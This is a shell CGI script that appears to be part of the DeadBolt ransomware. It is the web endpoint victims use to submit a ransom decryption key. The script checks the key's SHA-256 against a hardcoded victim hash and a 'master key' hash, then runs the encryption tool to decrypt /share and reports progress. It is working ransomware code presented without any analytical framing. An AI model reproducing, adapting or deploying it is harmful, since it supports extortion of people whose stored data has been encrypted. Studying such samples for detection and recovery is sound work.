#!/bin/sh

echo "Content-Type: text/html"
echo ""

get_value () {
	echo "$1" | awk -F "${2}=" '{ print $2 }' | awk -F '&' '{ print $1 }'
}

not_running() { echo '{"status":"not_running"}'; exit; }

PID_FILENAME=/tmp/deadbolt.pid
STATUS_FILENAME=/tmp/deadbolt.status
FINISH_FILENAME=/tmp/deadbolt.finish
TOOL=/mnt/HDA_ROOT/27855
CRYPTDIR=/share

if [ "$REQUEST_METHOD" = "POST" ]; then
	DATA=`dd count=$CONTENT_LENGTH bs=1 2> /dev/null`'&'
	ACTION=$(get_value "$DATA" "action")
	if [ "$ACTION" = "decrypt" ]; then
		KEY=$(get_value "$DATA" "key")
		if [ "${#KEY}" != 32 ]; then
			echo "invalid key len"
			exit
		fi

		K=/tmp/k-$RANDOM
		echo -n > $K
		for i in `seq 0 2 30`; do
			printf "\x"${KEY:$i:2} >> $K
		done
		SUM=$(sha256sum $K | awk '{ print $1 }')
		rm $K

		if [ "$SUM" = "5f52dcbb4c0638e291dbc339377cc2393515d3ef2a1862a0cdf9479beb7ac14b" ]; then
			echo "correct key"
			exec >&-
			exec 2>&-
			${TOOL} -d "$KEY" "$CRYPTDIR"
		elif [ "$SUM" = "93f21756aeeb5a9547cc62dea8d58581b0da4f23286f14d10559e6f89b078052" ]; then
			echo "correct master key"
			exec >&-
			exec 2>&-
			${TOOL} -d "$KEY" "$CRYPTDIR"
		else
			echo "wrong key."
		fi
	elif [ "$ACTION" = "status" ]; then
		if [ -f "$FINISH_FILENAME" ]; then
			echo '{"status":"finished"}'
			exit
		fi

		if [ -f "$PID_FILENAME" ]; then
			PID=$(cat "$PID_FILENAME")
			if [ "$PID" = "" ]; then
				not_running
			fi
			if [ ! -d "/proc/$PID" ]; then
				not_running
			fi
		fi

		if [ -f "$STATUS_FILENAME" ]; then
			COUNT=$(cat "$STATUS_FILENAME")
			echo '{"status":"running","count":"'${COUNT}'"}'
		else
			not_running
		fi
	else
		echo "invalid action"
	fi
else
	echo "" | base64 -d 2>/dev/null
fi